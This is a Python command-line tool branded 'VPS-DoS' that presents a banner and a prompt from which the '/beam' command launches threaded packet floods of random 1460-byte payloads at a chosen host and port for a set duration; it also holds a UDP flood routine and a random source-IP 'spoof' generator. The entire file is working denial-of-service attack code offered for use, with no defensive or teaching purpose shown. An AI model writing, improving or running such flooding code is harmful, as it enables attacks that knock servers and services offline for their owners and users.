#!/usr/bin/env/python3

import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json
import time

nicknm = 'root'

banner = ('''\033[1;36;40mgithub.com/ordinary-voaleh \033[1;35;40m| \033[1;36;40mvoaleh#2523
\033[1;36;40mWelcome back to \033[1;35;40mVPS-DoS, \033[1;36;40m''' + nicknm + '.')

def Spoof():

    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


cookie = open(".VPS-DoS","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):

	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1

	while time.time() < timeout and ldap and attack:

		sock.sendto(punch, (host, int(port)))

	running -= 1
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, payload):

	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:

		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))

	atks -= 1
	running -= 1

def main():

	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:

		sys.stdout.write("\x1b]2;VPS-DoS | ordinary-voaleh @ Github.com\x07")
		print('\033[1;37;40m\n╔═[\033[1;36;40m' + nicknm + '\033[1;37;40m@\033[1;36;40mVPS-DoS\033[1;37;40m]')
		sin = input('\033[1;37;40m╚\033[1;36;40m════$\033[1;32;40m ')
		sinput = sin.split(" ")[0]

		if sinput == "clear":

			os.system("clear")
			main()

		if sinput == "cls":

			os.system("clear")
			main()

		elif sinput == "exit":

			os.system("clear")
			exit()

		elif sinput == "/beam":

			try:

				if running >= 2:

					print("\033[97mSlow your roll buddy, more than 2 at a time decrease power!")
					main()

				else:

					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[1;37;40mYour Attack Has Been Launched \033[1;32;40mSuccesfully!")

			except ValueError:

				main()

			except socket.gaierror:

				main()

		elif sinput == "/stop":

			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:

			main()

try:

	os.system("clear")
	print(banner)
	main()

except KeyboardInterrupt:

	exit()